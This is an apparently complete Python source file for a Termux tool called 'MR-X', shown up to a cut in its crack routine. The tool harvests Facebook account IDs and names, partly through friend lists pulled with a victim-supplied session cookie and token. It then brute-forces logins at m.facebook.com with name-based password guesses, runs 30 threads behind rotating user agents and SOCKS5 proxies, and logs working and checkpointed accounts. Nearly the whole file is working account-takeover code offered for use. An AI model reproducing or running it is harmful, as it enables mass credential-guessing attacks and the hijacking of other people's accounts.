#-----------MR-X----------#

print("\033[1;37m (\u001b[36m>\033[1;37m) Checking for updates\033[1;37m")

#-----------------[ MODULE ]-------------------#
def modules():
	os.system('pkg update -y && pkg upgrade -y')
	os.system('clear')
	try: 
		import rich
	except ModuleNotFoundError:
		print("\033[1;37m (\u001b[36m>\033[1;37m) RICH IS BEING INSTALLED \033[1;37m")
		os.system('pip install rich --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] RICH HAS BEEN INSTALLED \033[1;37m")
	except:exit()
	try:
		import bs4
	except ModuleNotFoundError:
		print("\033[1;37m (\u001b[36m>\033[1;37m) BS4 IS BEING INSTALLED \033[1;37m")
		os.system('pip install bs4 --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] BS4 HAS BEEN INSTALLED \033[1;37m")
	except:exit()
	try:
		import requests
	except ModuleNotFoundError:
		print("\033[1;37m (\u001b[36m>\033[1;37m) REQUESTS IS BEING INSTALLED \033[1;37m")
		os.system('pip install requests --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] REQUESTS HAS BEEN INSTALLED \033[1;37m")
	except:exit()
	exit()
try:
	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket
	from bs4 import BeautifulSoup as bs
	from bs4 import BeautifulSoup
	import urllib3,rich,base64
	from rich.table import Table as me
	from rich.console import Console as sol
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
	from rich.console import Group as gp
	from rich.panel import Panel as nel
	from rich.panel import Panel
	from rich.tree import Tree
	from rich.panel import Panel as nel
	from rich.panel import Panel as panel
	from rich import print as cetak
	from rich.markdown import Markdown as mark
	from rich.columns import Columns as col
	from rich import print as prints
	from rich import pretty
	from rich.text import Text as tekz
	from time import localtime as lt	
	import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	pretty.install()
	CON=sol()
except ModuleNotFoundError:
	modules()
	

#------------------[ MR-X ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
rr = random.randint
rc = random.choice
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://github.com/Mohin-404/Approved/blob/main/Approved.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
    prox=open('.prox.txt','r').read().splitlines()
#------------------[ USER-AGENT ]-------------------#
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
for xx in range(1000):    
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
#------------[ DEFINE ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
pw = []
cpxx = []
cooki = []
aap = []
iddd = []
passww =[]
idf =[]
#------------[ COLOR ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\033[1;34m' # BIRU +
#--------------------[ TIME ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(thn)+'-'+str(bln)+'-'+str(tgl)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"   	
 
current_time = datetime.datetime.now()
current_hour = current_time.hour
if 5 <= current_hour < 12:
    greeting = "GOOD MORNING "
elif 12 <= current_hour < 17:
    greeting = "GOOD AFTERNOON "
elif 17 <= current_hour < 20:
    greeting = "GOOD EVENING "
else:
    greeting = "GOOD NIGHT "
#---------------------[IP]---------------------#
try:
	net = requests.get("http://ip-api.com/json/").json()["isp"]
	ipxx = requests.get("https://api.ipify.org").text    
except requests.exceptions.ConnectionError:
	print('\033[1;37m—————————————————————————\x1b[1;97m')
	print(" \033[1;37m(\u001b[36m>\033[1;37m) CHECK YOUR INTERNET")
	time.sleep(1)
	exit()
#------------------[ CUTS ]---------------#
def clear():
    os.system('clear')
def back():
    menu()
def contact():
    os.system('xdg-open https://www.facebook.com/mrx.440')
    back()
def line():
    print('\033[1;37m——————————————————————————————————————\x1b[1;97m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 #------------------[ MR-X ]-----------------#
logo =f"""
   ##::::'##:'########:::::::::::'##::::'##:
 ###::'###: ##.... ##::::::::::. ##::'##::
 ####'####: ##:::: ##:::::::::::. ##'##:::
 ## ### ##: ########::'#######:::. ###::::
 ##. #: ##: ##.. ##:::........::: ## ##:::
 ##:.:: ##: ##::. ##:::::::::::: ##:. ##::
 ##:::: ##: ##:::. ##:::::::::: ##:::. ##:
..:::::..::..:::::..:::::::::::..:::::..::033[1;36m0.2 \033[1;37m
\033[1;37m——————————————————————————————————————\x1b[1;97m
\033[1;37m——————————————————————————————————————\x1b[1;97m
\033[1;37m(\u001b[36m>\033[1;37m) OWNER  : MR-X
\033[1;37m(\u001b[36m>\033[1;37m) GITHUB : MR-X(Mohin-404)
\033[1;37m(\u001b[36m>\033[1;37m) TOOL   : PUBLIC × FILE CLONING
\033[1;37m——————————————————————————————————————\x1b[1;97m"""   
#---------------------[UID]---------------------#
def saurabh(id):
	if len(id)==15:
		if id[:10] in ['1000000000']       :saurav = '2009'
		elif id[:9] in ['100000000']       :saurav = '2009'
		elif id[:8] in ['10000000']        :saurav = '2009'
		elif id[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:saurav = '2009'
		elif id[:7] in ['1000006','1000007','1000008','1000009']:saurav = '2010'
		elif id[:6] in ['100001']          :saurav = '2010'
		elif id[:6] in ['100002','100003'] :saurav = '2011'
		elif id[:6] in ['100004']          :saurav = '2012'
		elif id[:6] in ['100005','100006'] :saurav = '2013'
		elif id[:6] in ['100007','100008'] :saurav = '2014'
		elif id[:6] in ['100009']          :saurav = '2015'
		elif id[:5] in ['10001']           :saurav = '2016'
		elif id[:5] in ['10002']           :saurav = '2017'
		elif id[:5] in ['10003']           :saurav = '2018'
		elif id[:5] in ['10004']           :saurav = '2019'
		elif id[:5] in ['10005']           :saurav = '2020'
		elif id[:5] in ['10008']           :saurav = '2022'
		elif id[:5] in ['10009']           :saurav = '2023'
		elif id[:5] in ['10007','10006']:saurav = '2021'
		else:saurav=''
	elif len(id) in [9,10]:
		saurav = '2008'
	elif len(id)==8:
		saurav = '2007'
	elif len(id)==14:
		saurav = '2023'			
	elif len(id)==7:
		saurav = '2006'
	else:saurav=''
	return saurav
#------------------[ NAME ]-------------------#
if not os.path.exists("data"):
    os.mkdir("data")
try:open("data/name.xml", "r")
except FileNotFoundError:
    open("data/name.xml", "w")
    pass
try:open("data/gf.xml", "r")
except FileNotFoundError:
    open("data/gf.xml", "w")
    pass
def namepsw():
    os.system('clear')      
    print(logo)
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        with open("data/name.xml", "r") as name_file_obj:
            uname = name_file_obj.readline().strip()
    else:
        print(" (\u001b[36m>\033[1;37m) ENTER YOUR REAL NAME")
        line()
        uname = input(" (\u001b[36m>\033[1;37m) ENTER YOUR NAME : ")
        line()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
    if os.path.exists("data/gf.xml") and os.path.getsize("data/gf.xml") > 0:
        with open("data/gf.xml", "r") as password_file_obj:
            upass = password_file_obj.readline().strip()
    else:
        print(" (\u001b[36m>\033[1;37m) ENTER YOUR GIRLFRND'S NAME")
        line()
        upass = input(" (\u001b[36m>\033[1;37m) ENTER YOUR GF NAME : ")
        line()
        with open("data/gf.xml", "w") as password_file_obj:
            password_file_obj.write(upass)
    animation("\033[1;37m (\u001b[36m>\033[1;37m) THANKS BRO-😂️ ")   
    line()    
    xxz = input('\033[1;37m (\u001b[36m>\033[1;37m) PRESS ENTER TO BACK')   
    os.system("python SAURAV.py")    
    exit()    
try:
    with open('data/name.xml', 'r') as name_file:
        uname = name_file.readline().strip()
    with open('data/gf.xml', 'r') as password_file:
        upass = password_file.readline().strip()
    if len(uname) > 1 and len(upass) > 1:
        pass
    else:
        namepsw()
except FileNotFoundError:
    namepsw()
except IOError:
    namepsw()
#--------------------[ ENTRY ]--------------#    
def entr():
	clear()
	print(logo)
	print(" (\u001b[36m1\033[1;37m) LOGIN TOOL BY COOKIE")
	print(f" (\u001b[36m2\033[1;37m) GO TO MENU ({b}WITHOUT COOKIE{P})")
	print(" (\u001b[36m3\033[1;37m) JOIN MESSANGER GC")
	line()
	ll = input(' \033[1;37m(\u001b[36m>\033[1;37m) CHOOSE : ')
	if ll in ['1']:
		login()
	elif ll in ['2']:		
		menu_next()  
	elif ll in ['3']:
		os.system('xdg-open https://m.me/j/AbbQvUmihgqiyckr/')
		entr()
	else:
		line()
		print(f' (\u001b[36m>\033[1;37m) WRONG CHOOSE HANIS HAU PAKHE😂');time.sleep(3)
		entr()
#--------------------[ LOGIN BY COOKIE ]--------------#    
ses = requests.Session()
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()


def login_lagi334():
 try:    
  os.system('clear')
  print(logo)
  print("(\u001b[36m>\033[1;37m) USE FRESS COOKIE TO LOGIN")
  line()
  cookie=input(f'{P}\033[1;37m(\u001b[36m>\033[1;37m) ENTER COOKIE : ')
  line()
  open(".cok.txt", "w").write(cookie)
  with requests.Session() as rsn:
   try:
    rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
    response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
    if '"access_token":' in str(response.headers):
     token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
     print(f"(\u001b[36m>\033[1;37m) YOUR TOKEN : {b}{token}")
     open(".token.txt", "w").write(token)     
     line();print(' (\u001b[36m>\033[1;37m)\x1b[1;92m LOGIN SUCCESSFUL!! ');line();xxz = input('\033[1;37m (\u001b[36m>\033[1;37m) PRESS ENTER TO BACK');back()
     
    else:
     print(''%(m, p))

   except:
    print(f' {P}\033[1;37m(\u001b[36m>\033[1;37m){m} INVALID COOKIE!!');line();xxz = input('\033[1;37m (\u001b[36m>\033[1;37m) PRESS ENTER TO BACK');back()

  print(f' ');time.sleep(1)
  exit()
 except Exception as e:
  os.system("rm -f .token.txt")
  os.system("rm -f .cok.txt")
  print(' (\u001b[36m>\033[1;37m) THAIT MULA!! ')
  print(e)
  exit()
#------------------[ MENU ]----------------#
def menu():
    clear(),print(logo)       
    try:
    	cok = open('.cok.txt','r').read()
    	token = open('.token.txt','r').read()
    except (IOError,KeyError,FileNotFoundError):
    	entr()
    try:
    	info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
    	id = info_datafb["id"]
    	nama = info_datafb["name"]
    except requests.exceptions.ConnectionError:
    	exit(' (\u001b[36m>\033[1;37m) INTERNET CHECK HAN !! ')
    except KeyError:
    	try:os.remove(".cok.txt");os.remove(".token.txt")
    	except:pass  
    print(f"\033[1;37m(\u001b[36m>\033[1;37m) COOKIE USERNAME : {nama}")
    print(f"\033[1;37m(\u001b[36m>\033[1;37m) COOKIE USER ID : {id}")
    line()
    print(f"""(\u001b[36m1\033[1;37m) PUBLIC CLONING""")    
    print(f"""(\u001b[36m2\033[1;37m) FILE CLONING""")    
    print(f"""(\u001b[36m3\033[1;37m) REMOVE DUPLICATE UIDS""")
    print(f"""(\u001b[36m4\033[1;37m) SEPARATE UID FROM FILE""")
    print(f"""(\u001b[36m5\033[1;37m) JOIN MESSANGER GROUP """)
    print(f"""(\u001b[36m6\033[1;37m) REPORT THE ISSUE """)
    print("""(\u001b[36m0\033[1;37m) REMOVE COOKIE""")
    line()
    Mrx = input('\033[1;37m(\u001b[36m>\033[1;37m) CHOOSE : ')
    if Mrx in ['1']:
    	line()
    	dump()
    elif Mrx in ['2']:	
       crack_file()	
    elif Mrx in ['3']:  
        remove_dub()
    elif Mrx in ['4']:
    	saprate()   
    elif Mrx in ['5']:  
        os.system('xdg-open https://m.me/j/AbbQvUmihgqiyckr/')
        back()
    elif Mrx in ['6']:
        contact()
        back()
    elif Mrx in ['0','00']:    			
        os.system('rm -rf .cok.txt && rm -rf .token.txt');line()
        animation('\033[1;37m(\u001b[36m>\033[1;37m) SUCESSFULLY REMOVED COOKIE')
        login()
    else:
        line()
        print(f' (\u001b[36m>\033[1;37m) WRONG CHOOSE ');time.sleep(3)
        back()
#------------------[ MENU NEXT ]----------------#
def menu_next():
    clear(),print(logo)     
    print(f"\033[1;37m(\u001b[36m>\033[1;37m) COOKIE USERNAME : NOT LOGIND ")
    print(f"\033[1;37m(\u001b[36m>\033[1;37m) COOKIE USER ID : NOT LOGIND ")
    line()
    print(f"\033[1;37m(\u001b[36m>\033[1;37m) {greeting}:\033[1;99m "+uname)
    print("\033[1;37m(\u001b[36m>\033[1;37m) TODAY'S DATE  :\033[1;99m "+date)  
    print("\033[1;37m(\u001b[36m>\033[1;37m) YOUR INTERNET :\033[1;99m "+net)
    print("\033[1;37m(\u001b[36m>\033[1;37m) YOUR IP :\033[1;36m "+ipxx)
    line()
    print(f"""(\u001b[36m1\033[1;37m) PUBLIC CLONING""")    
    print(f"""(\u001b[36m2\033[1;37m) FILE CLONING""")    
    print(f"""(\u001b[36m3\033[1;37m) REMOVE DUPLICATE UIDS""")
    print(f"""(\u001b[36m4\033[1;37m) SEPARATE UID FROM FILE""")
    print(f"""(\u001b[36m5\033[1;37m) JOIN MESSANGER GROUP """)
    print(f"""(\u001b[36m6\033[1;37m) REPORT THE ISSUE """)
    print("""(\u001b[36m0\033[1;37m) REMOVE COOKIE""")
    line()
    Mrx = input('\033[1;37m(\u001b[36m>\033[1;37m) CHOOSE : ')
    if Mrx in ['1']:
    	line()
    	dump()
    elif Mrx in ['2']:	
        crack_file()   	
    elif Mrx in ['3']:  
        remove_dub()
    elif Mrx in ['4']:
    	saprate()   
    elif Mrx in ['5']:  
        os.system('xdg-open https://m.me/j/AbbQvUmihgqiyckr/')
        back()
    elif Mrx in ['6']:
        contact()
        back()
    elif Mrx in ['0','00']:    			
        os.system('rm -rf .cok.txt && rm -rf .token.txt');line()
        animation('\033[1;37m(\u001b[36m>\033[1;37m) SUCESSFULLY REMOVED COOKIE')
        login()
    else:
        line()
        print(f' (\u001b[36m>\033[1;37m) WRONG CHOOSE ');time.sleep(3)
        back()
#-------------[ sprt.uids]------------------#
def saprate():
    line()    
    try:
        limit = int(input(' (\u001b[36m>\033[1;37m) HOW MANY LINKS DO YOU WANT TO SEPARETE : '))        
    except:
        limit = 1    
    line()   
    print(f""" (\u001b[36m>\033[1;37m) PUT YOUR FILE FOR SEPARATE""")    
    line()
    print(' (\u001b[36m>\033[1;37m) EXAMPLE : /sdcard/OLD.txt')
    line()
    file_name = input(' (\u001b[36m>\033[1;37m) FILE NAME : ')
    line()
    print(f""" (\u001b[36m>\033[1;37m) PUT YOUR NEW FILE NAME""")    
    line()
    print(' (\u001b[36m>\033[1;37m) EXAMPLE : /sdcard/NEW.txt')
    line()
    new_save = input(' (\u001b[36m>\033[1;37m) NEW FILE NAME : ')
    line()
    y = 0
    print(' (\u001b[36m>\033[1;37m) EXAMPLE : 10001,10002,10003')
    line()
    for k in range(limit):
        y += 1               
        links = input(' (\u001b[36m>\033[1;37m) PUT LINKS  %s: ' % (y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    line()
    print(' (\u001b[36m>\033[1;37m) LINKS GRABBED SUCCESSFULLY')
    line()
    print(' (\u001b[36m>\033[1;37m) TOTAL GRABBED LINKS: ' +
          str(len(open(new_save).read().splitlines())))
    line()      
    print(' (\u001b[36m>\033[1;37m) NEW FILE SAVE AS :\033[1;36m '+new_save)
    line()
    input(' (\u001b[36m>\033[1;37m) PRESS ENTER TO BACK ')
    menu()
#-------------[ DUB.IDZ ]------------------#    
def remove_dub():
    line()
    print(f""" (\u001b[36m>\033[1;37m) DUBBLE LINKS CUTTER """)    
    line()
    print(' (\u001b[36m>\033[1;37m) EXAMPLE : /sdcard/MR-X.txt')
    line()
    file_path = input(' (\u001b[36m>\033[1;37m) FILE NAME : ')
    with open(file_path, "r") as file:
		    lines = file.readlines()
    with open(file_path, "w") as file:
		    file.writelines(set(lines))
    line()
    print(" (\u001b[36m>\033[1;37m) SUCCESSFULLY REMOVED DUBBLE UIDS ")
    line()
    print(" (\u001b[36m>\033[1;37m) YOUR TOTAL IDZ :\033[1;36m " + str(len(open(file_path).read().splitlines())))
    line()
    input(' (\u001b[36m>\033[1;37m) PRESS ENTER TO BACK ');menu()   
#--------------[ PUBLIC METHOD ]-------------------#    
def dump():
 try:
  token = open('.token.txt','r').read()
  cok = open('.cok.txt','r').read()
 except IOError:
     login()
 try: 	
     jum = int(input(' (\u001b[36m>\033[1;37m) INPUT UID LIMIT : '))
 except ValueError:
     line();print(' (\u001b[36m>\033[1;37m) VUL A  MAL KHAKSO VAI😑');time.sleep(3)
     back()
 if jum<1 or jum>1000:
     line();print(' (\u001b[36m>\033[1;37m) LIMIT MAL KHAW NAKI 😂');time.sleep(3)
     back()
 ses=requests.Session()
 line()
 yz = 0
 for met in range(jum):
  yz+=1
  kl = input(' (\u001b[36m>\033[1;37m) INPUT UID '+str(yz)+' : ')
  idf.append(kl)
 for user in idf:
     try:
        head = (
        {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
        })
        if len(id) == 0:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }           
        )
        else:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }            
        )
        b = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
        for mi in b['friends']['data']:
            try:
                iso = (mi['id']+'|'+mi['name'])
                if iso in id:pass
                else:id.append(iso)
            except:continue
     except (KeyError,IOError):
       pass
     except requests.exceptions.ConnectionError:
       print('(\u001b[36m>\033[1;37m) FERI HAL  ')
       exit()
 try:
       setupp()
 except requests.exceptions.ConnectionError:
     print(f'{u}')
     print(' (\u001b[36m>\033[1;37m) No Internet connection ')
     exit()
 except (KeyError,IOError):
  print(f' (\u001b[36m>\033[1;37m) Not Public  {u}')
  time.sleep(3)
  exit()
 #-------------[ ENTER FILE ]------------------#
def crack_file():
    os.system('clear')
    os.system('espeak -a 300 " your file name"')
    print('\033[1;32m[ Put File Example:  /sdcard/MR-X.txt  Etc...]')
    line()   
    o = input('\x1b[1;97m [+] INPut FILE NAME : ')
    try:lin = open(o).read().splitlines()
    except:
        line()
        print('File Not Found')
        time.sleep(2)
        back ()
    for xid in lin:
        id.append(xid)
    setupp()
#-------------[ SETUP ]---------------#
def setupp():
    line()
    print(' (\u001b[36m>\033[1;37m) YOUR TOTAL IDZ : \033[1;36m'+str(len(id)))
    line()
    print(" (\u001b[36m>\033[1;37m) CHOOSE YOUR ID TYPE")
    line()
    print(" (\u001b[36m1\033[1;37m) FOR OLD IDS")
    print(" (\u001b[36m2\033[1;37m) FOR NEW IDS")
    print(" (\u001b[36m3\033[1;37m) FOR MIX IDS")
    line()
    hu = input(' (\u001b[36m>\033[1;37m) CHOOSE : ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    line()
    print(" (\u001b[36m>\033[1;37m) LOGIN METHOD ")
    line()
    print(" (\u001b[36m1\033[1;37m) METHOD 1 (\u001b[36mMOBILE.FACEBOOK\033[0;97m)")
    print(" (\u001b[36m2\033[1;37m) METHOD 2 (\u001b[36mFREE.FACEBOOK\033[0;97m)")
    line()
    hc = input(' (\u001b[36m>\033[1;37m) CHOOSE : ')
    line()         
    print(" (\u001b[36m>\033[1;37m) CHECKPOINT ID OPTIONS ")
    line()
    print(" (\u001b[36m1\033[1;37m) SHOW CP ACCOUNTS")
    print(" (\u001b[36m2\033[1;37m) DON'T SHOW CP ACCOUNTS")
    line()
    saurav = input(' (\u001b[36m>\033[1;37m) CHOOSE : ')
    if saurav in ['y','Y','111','01','11','1']:
       cpxx.append('y')
    else:
       cpxx.append('n')
    line()
    print(" (\u001b[36m>\033[1;37m) COOKIE OPTIONS ")
    line()
    print(" (\u001b[36m1\033[1;37m) SHOW COOKIE ")
    print(" (\u001b[36m2\033[1;37m) DON'T SHOW COOKIE")
    line()
    saurabh = input(' (\u001b[36m>\033[1;37m) CHOOSE : ')
    if saurabh in ['y','Y','111','01','11','1']:
       cooki.append('y')
    else:
       cooki.append('n')
    pass__()
    exit() 
#-------------------[ PASSWORD]------------#
def pass__():
    os.system('clear')
    print(logo)
    print('\033[1;37m(\u001b[36m>\033[1;37m) CLONING STARTED TIME : \033[1;97m'+time.strftime("%H:%M")+" "+ tag)
    print(f'(\u001b[36m>\033[1;37m) TOTAL IDZ TO SCAN :\033[1;36m',str(len(id)))
    line()
    print(f'\033[1;37m(\u001b[36m>\033[1;37m) FLIGHT MODE USE HANNE GAR BHAI')
    line()
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,full_name = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            first_name = full_name.split(' ')[0]
            pwv = []
            try:
            	last_name = full_name.split(' ')[1]
            except:
            	last_name = ''
            if len(full_name)<6:
                if len(first_name)<3:
                    pass
                else:                
                    pwv.append(first_name+'12')
                    pwv.append(first_name+'123')
                    pwv.append(first_name+'1234')
                    pwv.append(first_name+'12345')
                    pwv.append(full_name)
                    pwv.append(first_name+'@123')
                    pwv.append(first_name+'@1234')
                    pwv.append(first_name+'@12345')
                    pwv.append(first_name+'@@@')
                    pwv.append(first_name+'123@')
                    pwv.append(full_name+'123')
                    pwv.append(full_name+'@123')
                    pwv.append(first_name+'321')
                    pwv.append(first_name+'54321')
                    pwv.append(first_name+'123456789')
                    pwv.append(first_name+'12345@') 
                    pwv.append(last_name+'123') 
                    pwv.append(last_name+'12345') 
                    pwv.append(first_name+'098') 
                                                                                                                                                             
            else:
                if len(first_name)<3:
                    pwv.append(full_name)
                else:
                    pwv.append(first_name+'12')
                    pwv.append(first_name+'123')
                    pwv.append(first_name+'1234')
                    pwv.append(first_name+'12345')
                    pwv.append(full_name)
                    pwv.append(first_name+'@123')
                    pwv.append(first_name+'@1234')
                    pwv.append(first_name+'@12345')
                    pwv.append(first_name+'@@@')
                    pwv.append(first_name+'123@')
                    pwv.append(full_name+'123')
                    pwv.append(full_name+'@123')
                    pwv.append(first_name+'321')
                    pwv.append(first_name+'54321')
                    pwv.append(first_name+'123456789')
                    pwv.append(first_name+'12345@') 
                    pwv.append(last_name+'123') 
                    pwv.append(last_name+'12345') 
                    pwv.append(first_name+'098') 
                                        
            if 'y' in cpxx:
                pool.submit(crack2,idf,pwv)            
            else:
                pool.submit(crack,idf,pwv)
    line()
    print(' (\u001b[36m>\033[1;37m) CLONING COMPLETE TIME : \033[1;97m'+time.strftime("%H:%M")+" "+ tag)
    print(' (\u001b[36m>\033[1;37m) TOTAL OK ID : %s '%(ok))
    if 'y' in cpxx:
    	print(' \033[1;37m(\u001b[36m>\033[1;37m) TOTAL CP ID : %s '%(cp))
    else:
    	("")
    line()
    muzi = input(' (\u001b[36m>\033[1;37m) \033[1;37m ENTER TO BACK')
    back()    
    
#--------------------[ METHOD ]-----------------#
def crack(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}(Mrx){P} ({P}{loop}{P}-{P}{len(id)}{P}) (OK{P}-{H}{ok}{P}) ({'{:.0%}'.format(loop/float(len(id)))}{P})"),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.9"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}         
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])            
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
               if 'y' in cpxx:
                print(f'\r{P} {K}({M}MR🛠️X💚🥀-Check{K}){P} {M}{idf} {P}>{M} {pw} {P}>{M} {saurabh(idf)}{P}')   
